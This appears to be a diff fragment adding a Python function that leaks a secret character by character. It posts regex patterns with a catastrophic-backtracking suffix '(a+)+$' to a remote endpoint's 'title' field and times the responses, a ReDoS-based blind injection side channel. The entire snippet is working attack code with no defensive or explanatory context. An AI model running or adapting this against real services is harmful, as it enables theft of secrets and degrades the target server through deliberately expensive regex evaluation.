+```python
+def leak_char(known_prefix, position):
+    for c in string.printable:
+        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
+        start = time.time()
+        resp = requests.post(url, json={"title": pattern})
+        if time.time() - start > threshold:
+            return c
+```
